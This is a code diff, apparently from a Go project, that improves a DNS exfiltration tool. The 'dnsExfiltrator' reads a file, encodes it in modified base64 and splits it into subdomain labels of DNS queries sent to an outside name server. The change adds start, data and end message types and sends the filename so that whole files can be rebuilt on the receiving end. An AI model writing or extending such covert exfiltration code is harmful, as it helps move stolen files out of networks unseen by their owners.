@@ -40,7 +40,7 @@ func encodeToModifiedBase64(data []byte) string {
 	return strings.Replace(base64Data, "=", "-", -1)
 }
 
-func (ex *dnsExfiltrator) exfiltrateData(encodedData string) {
+func (ex *dnsExfiltrator) exfiltrateData(msgType dnsMsgType, encodedData string) {
 	// Domain names in messages are expressed in terms of a sequence of labels.
 	// Each label is represented as a one octet length field followed by that
 	// number of octets. Since every domain name ends with the null label of
@@ -51,12 +51,13 @@ func (ex *dnsExfiltrator) exfiltrateData(encodedData string) {
 	// - https://www.rfc-editor.org/rfc/rfc1035#section-3.1
 	//
 	// This means that we need to take into account the length byte at the very
-	// start as well as at the very end, hence subtract 2.
-	numOfBytesPerQuery := MAX_DOMAIN_NAME_LENGTH - len(ex.NameServer) - 2
+	// start as well as at the very end, hence subtract 2. We subtract another
+	// 2 for the DNS message type.
+	numOfBytesPerQuery := MAX_DOMAIN_NAME_LENGTH - len(ex.NameServer) - 2 - 2
 
 	for len(encodedData) != 0 {
 		bytesLeft := numOfBytesPerQuery
-		dataToExfiltrate := ""
+		dataToExfiltrate := msgType.ToString() + "."
 		for bytesLeft > 0 {
 			numBytesToAdd := bytesLeft
 			if numBytesToAdd > MAX_SUBDOMAIN_NAME_LENGTH {
@@ -90,6 +91,9 @@ func (ex *dnsExfiltrator) ExfiltrateFile(filename string) {
 		log.Fatalln(err)
 	}
 
+	encodedFilename := encodeToModifiedBase64([]byte(filename))
+	ex.exfiltrateData(DNS_FILE_START, encodedFilename)
 	encodedData := encodeToModifiedBase64(data)
-	ex.exfiltrateData(encodedData)
+	ex.exfiltrateData(DNS_FILE_DATA, encodedData)
+	ex.exfiltrateData(DNS_FILE_END, encodedFilename)
 }
